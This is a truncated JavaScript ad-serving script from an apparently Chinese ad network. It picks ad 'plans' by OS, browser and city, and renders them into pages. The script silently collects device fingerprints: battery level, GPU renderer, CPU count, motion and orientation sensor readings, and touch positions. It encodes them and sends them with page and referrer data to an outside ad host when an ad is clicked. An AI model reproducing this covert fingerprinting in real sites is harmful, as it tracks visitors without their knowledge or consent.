   var doccc = document;
   var isviewport = 1;
   var gmate = doccc.getElementsByTagName('meta');
   for (var i = 0, len = gmate.length; i < len; i++) {
       if (gmate[i] && gmate[i].getAttribute('name') == 'viewport') {
           isviewport = 0
       }
   }
   if (isviewport) {
       var node = doccc.createElement('meta');
       node.content = 'width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no';
       node.name = 'viewport';
       var head = doccc.getElementsByTagName('head')[0];
       head.insertBefore(node, head.firstChild)
   };;
   (function () {
       window['yrneiqian'] = 1;
       var a = {},
           ac = {};
       a.RK = a.oldRK = 0;
       a.zone_type = 'neiqian';
       var xid = getRandStr(),
           doc = document,
           __tpltype = 1,
           WID = getRandStr(8);

       var w_zl_url = '',
           w_plan = [];
    var lvtiannongpinurl = "https://v.ksc.app?";
       w_plan[0] = [166, 120, 1, lvtiannongpinurl, '', '', '12', '', '', '', '0', lvtiannongpinurl, '0', '0', '0', '', '', 63];
       w_plan[1] = [139, 120, 2, lvtiannongpinurl, '', '', '12', '', '', '', '0', lvtiannongpinurl, '0', '0', '0', '', '', 63];
       w_plan[6] = [167, 120, 2, lvtiannongpinurl, '', '', '12', '', '', '', '0', lvtiannongpinurl, '0', '0', '0', '', '', 299];
       var w_imglist = [];
       w_imglist[1] = ['https://video.lvtian.vip/download2.gif', 2, 450, 167, 12, 1, 640, 200, '', '', 0, 37];
       var w_zoneid = '15131',
           w_uid = '5144',
           w_ads_size = 1,
           w_width = 640,
           w_height = 200,
           w_cols = 1,
           w_rows = 1,
           w_backdomain = "https://v.ksc.app?";
       var w_dtan_rate = 0;
       var cdate = new Date(),
           _zk_qiqi_cpc = -1,
           _zvn_qiqi_cpc = 0,
           _zj_qiqi_cpc = -1,
           _is_jifei = 0,
           __wangzhai_s_id = '9136';

       var _body = doc.body ? doc.body : doc.documentElement,
           g_plan_index = 0;
       a.ucb = -1, a.uce = -1, a.xx = 0, a.yy = 0, a.isdt = 0;
       var startTop = -1,
           startY = -1,
           startX = -1,
           EndX = -1,
           EndY = -1;
       var _sdate = new Date();
       var _iv = '';

       Array.prototype.S = String.fromCharCode(2);
       Array.prototype.in_array = function (e) {
           var r = new RegExp(this.S + e + this.S);
           return (r.test(this.S + this.join(this.S) + this.S));
       };

       a.$ = function (e) {
           if (typeof e == 'string') return doc.getElementById(e);
           else return !1;
       };
       a.close = 0;
       a.imageUseStorage = parseInt('0', 10); //是否启用locastorage
       a.cpc_full_gl = parseInt('0', 10);
       a.cpc_dtan_gl = parseInt('0', 10);
       a.cpc_close_odds = parseInt('0', 10);
       a.cpc_dtan_height = parseInt('0', 10);
       a.is_auto_time = parseInt('0', 10);
       a.pc_hide = parseInt('0', 10);

       a.system = {
           win: false,
           mac: false,
           xll: false
       };
       a.p = navigator.platform;
       a.system.win = a.p.indexOf("Win") == 0;
       a.system.mac = a.p.indexOf("Mac") == 0;
       a.system.x11 = (a.p == "X11") || (a.p == 'Linux');
       a.is_pc = (a.system.win || a.system.mac || a.system.xll);

       if (a.pc_hide == 1 && a.is_pc) {
           // noinspection JSAnnotator
           return false;
       }

       a.plan_full_gl = 0;
       a.plan_dt_oods = 0;
       a.plan_dt_height = 0;
       a.isdt = 0;

       a.MT = function (b) {
           var Z = {};
           if (b in Z)
               return Z[b];
           return Z[b] = navigator.userAgent.toLowerCase().indexOf(b) != -1
       };
       a.MF = function (s) {
           if (!s)
               return '';
           str = s.replace(/[\u4E00-\u9FA5]/ig, 'x');
           return str;
       };
       a.GR = function () {
           var r;
           try {
               r = window.top.document.referrer;
           } catch (e) {
               r = document.referrer;
           }
           if (r) {
               return escape(r)
           } else {
               return '';
           }
       };
       a.GS = function () {
           var s;
           try {
               s = window.top.document.location.href;
           } catch (e) {
               s = doc.location.href;
           }
           if (s) {
               return escape(a.MF(s))
           } else {
               return '';
           }
       };
       a.GT = function () {
           return (-new Date().getTimezoneOffset()) / 60;
       };
       a.GF = function () {
           if (navigator.plugins && navigator.mimeTypes.length) {
               var b = navigator.plugins["Shockwave Flash"];
               if (b && b.description) return b.description.replace(/([a-zA-Z]|\s)+/, "").replace(/(\s)+r/, ".")
           } else if (a.MT("msie") && !window.opera) {
               var c = null;
               try {
                   c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7")
               } catch (e) {
                   var _a = 0;
                   try {
                       c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
                       _a = 6;
                       c.AllowScriptAccess = "always"
                   } catch (e) {
                       if (a == 6) {
                           return _a.toString();
                       }
                   }
                   try {
                       c = new ActiveXObject("ShockwaveFlash.ShockwaveFlash")
                   } catch (e) {}
               }
               if (c != null) {
                   var _a = c.GetVariable("$version").split(" ")[1];
                   return _a.replace(/,/g, ".")
               }
           }
           return "0";
       };
       a.GH = function () {
           return doc.body ? doc.body.offsetHeight : doc.documentElement.offsetHeight;
       };
       a.GW = function () {
           return doc.body ? doc.body.offsetWidth : doc.documentElement.offsetWidth;
       };
       a.Hi = function (o) {
           cdate.setTime(cdate.getTime() + 86400000);
           a.SCO("_click_a_" + w_zoneid, 1, cdate);
           try {
               a.$(o).style.display = 'none';
           } catch (e) {}

       };

       function getRandStr(len) {
           len = len || 8;
           var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz';
           var maxPos = $chars.length;
           var pwd = '';
           for (i = 0; i < len; i++) {
               pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
           }
           return pwd;
       }

       function getCookie(c_name) {
           if (document.cookie.length > 0) {
               c_start = document.cookie.indexOf(c_name + "=");
               if (c_start != -1) {
                   c_start = c_start + c_name.length + 1;
                   c_end = document.cookie.indexOf(";", c_start);
                   if (c_end == -1) c_end = document.cookie.length;
                   return unescape(document.cookie.substring(c_start, c_end));
               }
           }
           return ""
       }
       a.dc = function () {
           if (!a.is_pc) {

           }
       };
       setTimeout(function () {
           a.dc();
       }, 1000);

       a.is = 0;
       a.SC = function (css, k) {
           k = typeof k != 'undefined' ? k : '';
           a.is++;
           a.DSS(k);
           if (css == null) return;
           try {
               var h = doc.getElementsByTagName('head')[0];
               var s = doc.createElement('style');
               s.type = 'text/css';
               if (a.is > 1) {
                   s.id = xid + k + '_cs';
               }
               if (s.styleSheet) s.styleSheet.cssText = css;
               else s.appendChild(doc.createTextNode(css));
               h.appendChild(s);
               return !0;
           } catch (e) {
               return !1
           }
       };
       a.DSS = function (k) {
           if (a.$(xid + k + '_cs')) {
               doc.head.removeChild(a.$(xid + k + '_cs'));
           }
       };

       a.AE = function (f, e) {
           if (e == null) e = 'onresize';

           var oe = window[e];
           if (typeof window[e] != 'function') {
               window[e] = f
           } else {
               window[e] = function () {
                   oe();
                   f()
               }
           }
       };
       a.getOS = function () {
           var sUserAgent = navigator.userAgent.toLowerCase(),
               sys = navigator.platform.toLowerCase();
           var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
           var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os" || sUserAgent.match(/iphone/i) == "iphone";
           var bIsAndroid = sUserAgent.match(/android/i) == "android" || sUserAgent.match(/linux/i) == "linux" || sys.match(/linux/i) == "linux";
           if (bIsAndroid) {
               return 1;
           } else if (bIsIphoneOs || bIsIpad) {
               return 2;
           } else {
               return 3;
           }
       };

       a.is_weixin = function () {
           return navigator.userAgent.toLowerCase().match(/micromessenger/i) == 'micromessenger'
       };

       a.getBrowers = function () {
           var ua = window.navigator.userAgent,
               list = [];
           list[0] = {
               id: 10,
               preg: '/Android.*?baidubrowser/i'
           };
           list[1] = {
               id: 11,
               preg: '/Android.*?MicroMessenger/i'
           };
           list[2] = {
               id: 12,
               preg: '/Android.*?UCBrowser/i'
           };
           list[3] = {
               id: 13,
               preg: '/Android.*?MQQBrowser/i'
           };
           list[4] = {
               id: 14,
               preg: '/Android.*?baiduboxapp/i'
           };
           list[5] = {
               id: 15,
               preg: '/Android.*?\(KHTML, like Gecko\)\sChrome/(.){7,15}\sMobile\sSafari/\d{2,6}.\d{2,5}$/i'
           };
           list[6] = {
               id: 16,
               preg: '/Android/i'
           };
           list[7] = {
               id: 17,
               preg: '/iPhone.*?baidubrowser/i'
           };
           list[8] = {
               id: 18,
               preg: '/iPhone.*?baiduboxapp/i'
           };
           list[9] = {
               id: 19,
               preg: '/iPhone.*?MicroMessenger/i'
           };
           list[10] = {
               id: 20,
               preg: '/iPhone.*?CriOS/i'
           };
           list[11] = {
               id: 21,
               preg: '/iPhone.*?UCBrowser/i'
           };
           list[12] = {
               id: 22,
               preg: '/iPhone.*?MQQBrowser/i'
           };
           list[13] = {
               id: 23,
               preg: '/iPhone.*?QHBrowser.*?QihooBrowser/i'
           };
           list[14] = {
               id: 24,
               preg: '/iPhone.*?Safar/i'
           };
           for (var i = 0; i < list.length; i++) {
               if (eval(list[i].preg).test(ua)) return list[i].id;
           }
           return 0;
       };

       a.checkBrowers = function (planbs) {
           if (planbs == '') return true;
           var bs = a.getBrowers(),
               bsarr = planbs.split(',');
           for (var i = 0; i <= bsarr.length; i++) {
               if (bsarr[i] == bs) {
                   return true;
                   break;
               }
           }
           return false;
       };
       a.checkPlanOS = function (planOS) {
           var os = a.getOS(); //1android 2ios 3其他/pc
           if (os == 1) {
               if (planOS == 0 || planOS == 1 || planOS == 3 || planOS == 5) return true;
           } else if (os == 2) {
               if (planOS == 0 || planOS == 2 || planOS == 3) return true;
           } else if (os == 3) {
               if (planOS == 0 || planOS == 4 || planOS == 5) return true;
           }
           return false;
       };
       a.checkLimitAreaPlan = function (is_areabook, arealist) {
           if (is_areabook === '') return true;
           var city = a.getCity();
           if (is_areabook == '1') {
               if (arealist == '') return false;
               var arr = arealist.split(','),
                   _i;
               for (_i in arr) {
                   var _city = arr[_i];
                   if (_city != '' && city.indexOf(_city) !== -1) return true;
               }
               return false;
           } else {
               if (arealist == '') return true;
               var arr = arealist.split(','),
                   _i;
               for (_i in arr) {
                   var _city = arr[_i];
                   if (_city != '' && city.indexOf(_city) !== -1) return false;
               }
               return true;
           }
       };
       var isloadJS = 0;
       a.getCity = function () {
           var area_back = '菲律宾  ',
               city = a.GCO('LMCITYASGASDGCI');
           if (area_back != '' || area_back != '未知') city = area_back;
           if (typeof city == 'undefined' || city == null || city == '') {
               if (typeof localAddress != 'undefined') {
                   try {
                       cdate.setTime(cdate.getTime() + 86400);
                       city = a.formatCity(localAddress.province, localAddress.city);
                       a.SCO('LMCITYASGASDGCI', city, cdate);
                   } catch (e) {}
               } else {
                   if (isloadJS == 0) a.loadJs('//ip.ws.126.net/ipquery?');
                   isloadJS = 1;
               }
               setTimeout(function () {
                   a.getCity();
               }, 50);
               city = city ? city : '附近';
           }
           return city;
       };

       a.formatCity = function (prov, city) {
           prov = prov.replace('市', '');
           city = city.replace('市', '');
           var citylist = '北京,天津,上海,重庆,台湾,香港,澳门';
           return citylist.indexOf(prov) > -1 ? prov : city;
       };
       a.loadJs = function (url, charset) {
           charset = charset || 'gb2312';
           var script = document.createElement("script");
           script.type = "text/javascript";
           script.src = url;
           script.charset = 'gb2312';
           try {
               document.body.appendChild(script);
           } catch (e) {
               document.head.appendChild(script);
           }
       };


       a.GE = function (i) {
           var e = 1 * i.substring(1, i.length),
               o = i.substring(0, 1);
           return "s" == o ? 1e3 * e : "h" == o ? 60 * e * 60 * 1e3 : "d" == o ? 24 * e * 60 * 60 * 1e3 : void 0
       };
       a.SCO = function (n, v, e) {
           document.cookie = n + "=" + escape(v) + ";expires=" + e.toGMTString() + ";path=/";
       };
       a.GCO = function (n) {
           var arr = document.cookie.match(new RegExp("(^| )" + n + "=([^;]*)(;|$)"));
           if (arr != null) return unescape(arr[2]);
           return '';
       };
       a.DCO = function (i) {
           var exp = new Date();
           exp.setTime(exp.getTime() - 1);
           var cval = a.GCO(i);
           if (cval != null)
               document.cookie = i + "=" + cval + ";expires=" + exp.toGMTString();
       };
       a.curr_pv = 0;
       a.dopv = function (op, siteid, zoneid, imgid, planid) {
           // var url = w_backdomain + '?/' + op + '-' + siteid + '-' + imgid + '-' + zoneid + '-' + planid + '-' + new Date().getTime() + '.html';
           // a.curr_pv++;
           // new Image().src = url;
           // var ajax = new XMLHttpRequest();
           // ajax.open('get', url);
           // ajax.send();
           // ajax.onreadystatechange = function () {
           //     // console.log(ajax.readyState);
           //     // console.log(ajax.status);
           //     if (ajax.readyState == 4 && ajax.status == 200) {
           //         // a.curr_pv = 0;
           //     } else if (ajax.readyState == 4 && ajax.status != 200) {
           //         //  a.curr_pv<=5 && a.dopv(op, siteid, zoneid, imgid, planid);
           //     }
           // }
       };
       a.showpv = function (zoneid, siteid, planid, imgid) {
           var v = a.GCO("_s_v_" + zoneid);
           var _arr = v.split(",");
           var _showid = planid + ',';
           if (!v || !a.in_array(_arr, planid)) {
               a.dopv('pv', siteid, zoneid, imgid, planid);
               cdate.setTime(cdate.getTime() + 3600000);
               var _str = v ? v + _showid : _showid;
               a.SCO("_s_v_" + zoneid, _str, cdate);
           }
       };

       a.ifra = function (u) {
           var f = document.createElement("iframe");
           f.style.cssText = "display:none";
           f.src = u;
           f.style.display = "none";
           f.setAttribute("scrolling", "no");
           f.setAttribute("frameborder", 0);
           document.body.appendChild(f)
       }

       a.CR = function () {
           if (1 === a.close) return false;
           for (var i = 0; i < w_plan.length; i++) {
               var aplan = w_plan[i];
               if (a.checkPlanOS(aplan[2])) return true;
           }
           return false;
       };
       a.GP = function () {
           var o = a.GNP(w_plan, false);
           return o;
       };
       a.in_array = function (o, k) {
           for (var i = 0; i < o.length; i++)
               if (o[i] == k) return true;
           return false;
       };
       __N = 0;
       a.GNP = function (arrPlan, flag) {
           if (__N >= 2) return false; //debug
           flag = flag || false;
           if (typeof arrPlan == "undefined") return null;
           if (arrPlan.length == 0) return null;
           var has_c_p = a.GCO("_has_click_plan" + w_zoneid);
           if (flag) {
               cdate.setTime(cdate.getTime() + 2 * 3600000);
               a.SCO("_has_click_plan" + w_zoneid, '', cdate);
           }

           var arrEffPlan = [];
           for (var i = 0; i < arrPlan.length; i++) {
               var arrPlan222 = arrPlan[i];
               if (has_c_p.indexOf('|' + arrPlan222[0] + '|') === -1 &&
                   a.checkPlanOS(arrPlan222[2]) &&
                   a.checkBrowers(arrPlan222[9]) &&
                   a.checkLimitAreaPlan(arrPlan222[7], arrPlan222[8])
               ) arrEffPlan.push(arrPlan222);
           }
           if (arrEffPlan.length == 0) return a.GNP(arrPlan, true);
           else {
               var retPlan = a.GRIP(arrEffPlan);
               return retPlan;
           }
       };

       a.GRIP = function (arrPlan) {
           var rnd_count = 0;
           for (var i = 0; i < arrPlan.length; i++) rnd_count += parseInt(arrPlan[i][1]);
           var rnd_num = Math.ceil(Math.random() * rnd_count);
           var bindex = 0;
           for (var i = 0; i < arrPlan.length; i++) {
               bindex += parseInt(arrPlan[i][1]);
               if (rnd_num <= bindex) return arrPlan[i];
           }
           return 0;
       };
       a.getRandImg = function (planid, imgtypes) {
           imgtypes = '|' + imgtypes + '|';
           var os = a.getOS(); //1android 2ios 3pc
           var ret1 = [];
           var ret2 = [];
           var ret3 = [];
           var k1 = 0;
           var k2 = 0;
           var k3 = 0;
           for (var i = 0; i < w_imglist.length; i++) {
               var sys = w_imglist[i][1];
               if (os == 3) {
                   //pc端
                   if (sys == 0 || sys == 1) {
                       var info = [w_imglist[i][0], w_imglist[i][2], w_imglist[i][5], w_imglist[i][6], w_imglist[i][7], w_imglist[i][8], w_imglist[i][9]];
                       if (w_imglist[i][3] == planid) {
                           ret2[k2] = info;
                           k2++;
                       } else if (w_imglist[i][3] == 0 && imgtypes.indexOf('|' + w_imglist[i][4] + '|') > -1) {
                           ret1[k1] = info;
                           k1++;
                       } else if (imgtypes == '' && w_imglist[i][3] == 0) {
                           ret3[k3] = info;
                           k3++;
                       }
                   }
               } else {
                   //手机端
                   if (sys == 0 || sys == 2) {
                       var info = [w_imglist[i][0], w_imglist[i][2], w_imglist[i][5], w_imglist[i][6], w_imglist[i][7], w_imglist[i][8], w_imglist[i][9], w_imglist[i][10]];
                       if (w_imglist[i][3] == planid) {
                           ret2[k2] = info;
                           k2++;
                       } else if (w_imglist[i][3] == 0 && imgtypes.indexOf('|' + w_imglist[i][4] + '|') > -1) {
                           ret1[k1] = info;
                           k1++;
                       } else if (imgtypes == '' && w_imglist[i][3] == 0) {
                           ret3[k3] = info;
                           k3++;
                       }
                   }
               }
           }
           if (ret2.length > 0) {
               return ret2[parseInt(Math.random() * ret2.length)];
           } else if (ret1.length > 0) {
               return ret1[parseInt(Math.random() * ret1.length)];
           } else if (ret3.length > 0) {
               return ret3[parseInt(Math.random() * ret3.length)];
           }
           return false;
       };
       a.getMousePos = function (event) {
           var e = event || window.event;
           var scrollX = doc.documentElement.scrollLeft || doc.body.scrollLeft;
           var scrollY = doc.documentElement.scrollTop || doc.body.scrollTop;
           if (!e) {
               return {
                   'x': 0,
                   'y': 0
               };
           }
           var x = e.pageX || e.clientX + scrollX;
           var y = e.pageY || e.clientY + scrollY;
           return {
               'x': x,
               'y': y
           };
       };

       a.getPlatform = function () {
           return navigator.platform;
       };
       a.copy = function (text) {
           var _a = {};
           _a.creteText = function () {
               var e = document.createElement("textarea");
               e.style.fontSize = "12pt";
               e.style.border = "0";
               e.style.padding = "0";
               e.style.margin = "0";
               e.style.position = "absolute";
               e.style.left = "-9999px";
               var k = window.pageYOffset || document.documentElement.scrollTop;
               e.style.top = k + "px";
               e.setAttribute("readonly", "");
               return e;
           };
           _a.func2 = function (k) {
               var j, l = k.hasAttribute("readonly");
               l || k.setAttribute("readonly", ""), k.select(), k.setSelectionRange(0, k.value.length), l || k.removeAttribute("readonly"), j = k.value;
               return j;
           };

           var n = _a.creteText();
           document.body.appendChild(n);
           n.value = text;
           var c = _a.func2(n),
               q = void 0;
           q = document.execCommand("copy");
           if (q) {
               document.body.removeChild(n);
           }
           return q;
       };
       a.getIV = function () {
           var iv = a.GCO('UBGLAI63GV');
           if (!iv) {
               var _cdate = new Date();
               iv = getRandStr(5) + '.' + parseInt(_cdate.getTime() / 1000);
               _cdate.setTime(_cdate.getTime() + 86400 * 1000);
               var _ndate = new Date(_cdate.getFullYear(), _cdate.getMonth(), _cdate.getDate(), 0, 0, 0);
               a.SCO('UBGLAI63GV', iv, _ndate);
           }
           return iv;
       };

       var yxx = {
           f: {
               dcc: "",
               dcl: "",
               cpn: "",
               gvd: "",
               grr: "",
               ct: "1",
               diit: [],
               dit: [],
               cmn: []
           },
           init: function () {
                   window.addEventListener('deviceorientation', function handleFunc(evnet) {
                       if (!event.alpha) {
                           return
                       }
                       var v = [event.alpha, event.beta, event.gamma].join(",");
                       if (yxx.f.diit.length < 5) {
                           yxx.f.diit.push(v)
                       }

                   }, false);

                   window.addEventListener('devicemotion', function handleFunc(evnet) {

                       var acceleration = evnet.accelerationIncludingGravity;
                       var v = [acceleration.x, acceleration.y, acceleration.z].join(",");
                       if (yxx.f.dit.length < 5) {
                           yxx.f.dit.push(v)
                       }

                   }, false);

                   window.addEventListener('touchstart', function touchstart(ev) {
                       var clientX = ev.touches[0].clientX;
                       var clientY = ev.touches[0].clientY;
                       var v = [clientX, clientY].join("_");
                       if (yxx.f.cmn.length < 5) {
                           yxx.f.cmn.push(v)
                       }
                   }, false);

               },
               battery: function () {
                   navigator.getBattery().then(function (battery) {
                       yxx.f.dcc = battery.charging ? "yes" : "no";
                       yxx.f.dcl = battery.level * 100 + "%";
                   })
               },

               gpu: function () {

                   var canvas = document.createElement('canvas'),
                       gl = canvas.getContext('experimental-webgl'),
                       debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

                   var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                   var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                   yxx.f.cpn = window.navigator.hardwareConcurrency;
                   yxx.f.gvd = vendor;
                   yxx.f.grr = renderer;

               },

               getConnection: function () {

                   if (!navigator.connection) {
                       return 1
                   }

                   if (!navigator.connection.type) {
                       return 1
                   }
                   yxx.f.ct = navigator.connection.type == "cellular" ? 2 : 3;
               },

               start: function () {
                   try {
                       yxx.init();
                       yxx.battery();
                       yxx.gpu();
                       yxx.getConnection();

                   } catch (err) {}
               },

               get: function () {
                   var p = [];
                   for (var e in yxx.f) {
                       if (e == "diit" || e == "dit" || e == "cmn") {
                           p.push(e + "=" + yxx.f[e].join(";"));
                       } else {
                           p.push(e + "=" + yxx.f[e]);
                       }
                   }
                   var _base64 = new a.Base64();
                   return _base64.encode(p.join("&"));
               }
       };

       yxx.start();
       a.n = 1;
       a.CP = function (i) {

           var _href = a._date_href,
               o = a.getMousePos(),
               action = (1 == a.isdt) ? a._date_href2 + '&it=1' : _href,
               myvalue = a._date_sp.split(','),
               u_sw = window.screen.width,
               u_sh = window.screen.height,
               u_url = a.GS(),
               r_url = a.GR(),
               u_scd = window.screen.colorDepth,
               u_bw = 1,
               u_bh = 1;
           if (window.innerWidth) {
               u_bw = window.innerWidth
           } else {
               if ((document.body) && (document.body.clientWidth)) {
                   u_bw = document.body.clientWidth
               }
           }
           if (window.innerHeight) {
               u_bh = window.innerHeight
           } else {
               if ((document.body) && (document.body.clientHeight)) {
                   u_bh = document.body.clientHeight
               }
           }

           var u_utz = a.GT(),
               u_fv = a.GF(),
               ucx = a.xx,
               ucy = a.yy,
               ucb = a.ucb,
               uce = a.uce,
               s_id = __wangzhai_s_id,
               cdate = new Date(),
               staytime = parseInt((cdate.getTime() - _sdate.getTime()) / 1000),
               _url = action + '&u_sw=' + u_sw + '&u_sh=' + u_sh + '&u_url=' + r_url + '&r_url=' + u_url + '&u_scd=' + u_scd + '&u_bw=' + u_bw + '&u_bh=' + u_bh + '&u_utz=' + u_utz + '&u_fv=' + u_fv + '&ucx=' + ucx + '&ucy=' + ucy + '&ucb=' + ucb + '&uce=' + uce + '&iv=' + _iv + '&vt=' + parseInt(new Date().getTime() / 1000) + '&s_id=' + s_id + '&imgid=' + myvalue[0] + '&plat=' + a.getPlatform() + '&staytime=' + staytime;
           _url += '&yd=' + yxx.get();
           if (2 == i) _url += '&it=1';
           if (1 == i) {
               return _url;
           } else {
               a.dopv('click', __wangzhai_s_id, w_zoneid, myvalue[0], myvalue[2]);
               var has_c_p = a.GCO("_has_click_plan" + w_zoneid);
               if (has_c_p.indexOf('|' + myvalue[2] + '|') === -1) {
                   has_c_p += '|' + myvalue[2] + '|';
               }
               cdate.setTime(cdate.getTime() + 2 * 3600000);
               a.SCO("_has_click_plan" + w_zoneid, has_c_p, cdate);
               // window.location.href = _url;
               a.n++;
               openwin(_url, xid + "FX" + a.n);
               //可以打开新窗口
               /**
         let open = window.open('about:blank')
         if (open === null || typeof(open) === 'undefined') {
            window.location.href = _url;
            return
        }
         setTimeout(() => {
            open.location = _url;
        }, 300);
         **/
           }

       };

       function openwin(url, id) {
           var a = document.createElement("a");
           a.setAttribute("href", url);
           a.setAttribute("target", "_blank");
           a.setAttribute("id", id);
           document.body.appendChild(a);
           a.click();
       }

       a.CLB = function () {
           var _rand = Math.ceil(Math.random() * 100);
           var _ctime = a.GCO('{close_time_type}');
           var _close_time = parseInt('{close_time}');
           var _t = (_rand <= parseInt('{close_gailv}')) ? 1 : 0;
           var _t2 = (!_close_time || _ctime < _close_time);
           if (_t && _t2) {
               _ctime = _ctime ? _ctime + 1 : 1;
               var d = new Date();
               var _time = d.setTime(d.getTime());
               d.setTime(d.getTime() + 3600000);
               _close_time && a.SCO('{close_time_type}', _ctime, d);
               a.CP(xid + '1_1');
           }
       };

       a.getPlanByPlanId = function (e) {
           var _i = w_plan.length;
           while (_i--) {
               if (e == w_plan[_i][0]) return w_plan[_i];
           }
           return false;
       };

       a.getImgInfo = function (index) {
           return [w_imglist[index][0], w_imglist[index][2], w_imglist[index][5], w_imglist[index][6], w_imglist[index][7], w_imglist[index][8], w_imglist[index][9], w_imglist[index][10], w_imglist[index][3]]
       };
       a.checkWebp = function () {
           try {
               return (document.createElement('canvas').toDataURL('image/webp').indexOf('data:image/webp') == 0);
           } catch (err) {
               return false;
           }
       };
       var old_imglist = w_imglist;
       a.R = function () {
           if (!a.CR()) return;
           var os = a.getOS(),
               cookie_name = 'mohe_img_has_show_' + __wangzhai_s_id,
               ads_cookie_name = 'mohe_ads_has_show_' + __wangzhai_s_id;

           w_plan = w_plan.filter(function (p) {
               return p[2] == os;
           });
           w_plan = w_plan.filter(function (p) {
               return a.checkLimitAreaPlan(p[7], p[8])
           });

           w_plan = w_plan.filter(function (p) {
               return a.checkLimitAreaPlan(p[15], p[16]);
           });

           if (__wangzhai_s_id == 3924) {

               var bs = a.getBrowers();
               w_plan = w_plan.filter(function (p) {
                   var planbs = p[9];
                   if (planbs == '') return true;
                   var bsarr = planbs.split(',');
                   for (var i = 0; i <= bsarr.length; i++) {
                       if (bsarr[i] != bs) {} else {
                           return true;
                           break;
                       }
                   }
                   return false;
               });
               console.log(w_plan)
           }

           var new_plan = [],
               a_uid = [];
           for (var i = 0; i < w_plan.length; i++) {
               new_plan.push(w_plan[i][0]);
               !a_uid.in_array(w_plan[i][17]) && a_uid.push(w_plan[i][17]);
           }
           //过滤已经展示过的广告商ID
           a_uid = a_uid.filter(function (c) {
               return (!a.GCO(ads_cookie_name) || !a.GCO(ads_cookie_name).split(',').in_array(c));
           });

           w_imglist = w_imglist.filter(function (img) {
               var _plan = a.getPlanByPlanId(img[3]),
                   _uid = _plan && _plan[17];
               return new_plan.indexOf(img[3]) > -1 &&
                   (!a.GCO(cookie_name) || (a.GCO(cookie_name).split(',').indexOf((img[2] + '|' + img[3]).toString()) == -1)) &&
                   (!a.GCO(ads_cookie_name) || !a.GCO(ads_cookie_name).split(',').in_array(_uid));
           }).sort(function (c, d) {
               if (d[11] == -1 && c[11] == -1) {
                   var __d = Math.random() - 0.5;
               } else {
                   var __d = d[11] - c[11];
               }
               return 1 == a.is_auto_time ? Math.random() - 0.5 : __d;
           });


           if (w_imglist.length == 0) return;


           var o = doc.compatMode == "BackCompat" ? doc.body : doc.documentElement;
           var pos = w_width / w_height;
           var w = o.clientWidth;
           var h = parseInt(w / pos);
           var html = "";
           var _R = '';
           a.s = [];
           for (var i = 0; i < w_rows; i++) {
               for (var j = 0; j < w_cols; j++) {
                   var index = (i + j) < w_imglist.length ? (i + j) : Math.round(Math.random() * w_imglist.length),
                       imginfo = a.getImgInfo(index),
                       planid = imginfo[8],
                       ads = a.getPlanByPlanId(planid),
                       url = ads[3],
                       url2 = ads[11],
                       title = ads[4],
                       description = ads[5],
                       imgtypes = ads[6],
                       imgurl = imginfo[0],
                       imgid = imginfo[1],
                       img_style = a.img_style = imginfo[2],
                       img_width = parseInt(imginfo[3] * w / w_width),
                       img_height = parseInt(imginfo[4] * h / w_height),
                       text_width = parseInt(w - img_width - 30),
                       img_title = imginfo[5];
                   if (img_title.indexOf('{city}') > -1) {
                       img_title = img_title.replace('{city}', a.getCity());
                   }
                   var img_description = imginfo[6];
                   if (img_description.indexOf('{city}') > -1) {
                       img_description = img_description.replace('{city}', a.getCity());
                   }

                   var img_has_show = a.GCO(cookie_name);
                   img_has_show += img_has_show ? ',' + imgid + '|' + planid : +imgid + '|' + planid;
                   cdate.setTime(cdate.getTime() + 3600000);
                   a.SCO(cookie_name, img_has_show, cdate);
                   if (w_imglist.length <= 1) {
                       a.SCO(cookie_name, '', cdate);
                       w_imglist = old_imglist;
                   }

                   if (false) {
                       var ads_has_show = a.GCO(ads_cookie_name);
                       ads_has_show += ads_has_show ? ',' + ads[17] : ads[17];
                       cdate.setTime(cdate.getTime() + 3600000);
                       a.SCO(ads_cookie_name, ads_has_show, cdate);
                       if (a_uid.length <= 1) {
                           a.SCO(ads_cookie_name, '', cdate);
                       }
                   }

                   if (a.is_weixin()) {
                       url = url2;
                   }

                   a._date_href = url;
                   a._date_href2 = url2 ? url2 : url;
                   a._date_sp = imgid + "," + w_zoneid + "," + planid;
                   a._img_url = imgurl;
                   a._title = img_title;

                   a.plan_full_gl = ads[10];
                   a.plan_dt_odds = ads[12];
                   a.plan_dt_height = ads[13];
                   a.is_one_t = ads[14];
                   a.curr_plan_id = planid;

                   if (imginfo[7] == 1) {
                       a.iscode = 1;
                       a.RK = 0;
                       html = a.doAdsCode(imginfo);
                       if (a.$(WID + '_2'))
                           a.$(WID + '_2').style.display = 'none';
                       a.showpv(w_zoneid, __wangzhai_s_id, planid, imgid);
                       break;
                   } else {
                       a.RK = a.oldRK;
                       if (a.checkWebp()) {
                           imgurl = imgurl;
                           a._img_url = imgurl;
                       }
                       a.s.push(imgurl);
                       html += '<div onclick="' + WID + '.CP(\'' + xid + w_rows + '_' + w_cols + '\');" data-sp="' + imgid + "," + w_zoneid + "," + planid + '" id="' + xid + w_rows + '_' + w_cols + '" data-href="' + url + '" style="text-align: left;">';
                       html += a.TPL(img_style, imgurl, w, h, img_width, img_height, img_title, img_description);
                       html += '</div>';
                       //_R += '.'+WID+'_r{background-image:url(' + imgurl + ');}';
                       a.showpv(w_zoneid, __wangzhai_s_id, planid, imgid);
                       w_dtan_rate = 1 == ads[10] ? w_dtan_rate : 0;
                   }

               }
           }
           if (typeof ismp === 'undefined') {

               if (typeof a.$(xid) !== 'undefined' && a.$(xid)) {
                   if (typeof a.$(xid + "Fa") != 'undefined' && a.$(xid + "Fa")) {
                       a.$(xid + "Fa").innerHTML = html;
                   } else {
                       a.$(xid).innerHTML = "<div class ='" + xid + "Fb " + xid + "Fa' id='" + xid + "Fa'>" + html + "</div>";
                   }
               }


               if (_R) {
                   a.is = 0;
                   a.SC(_R);
               }
               a.resize(w, h);
               var e = document.querySelectorAll("#" + xid + "Fa img"),
                   n = 0,
                   _a = setInterval(function () {
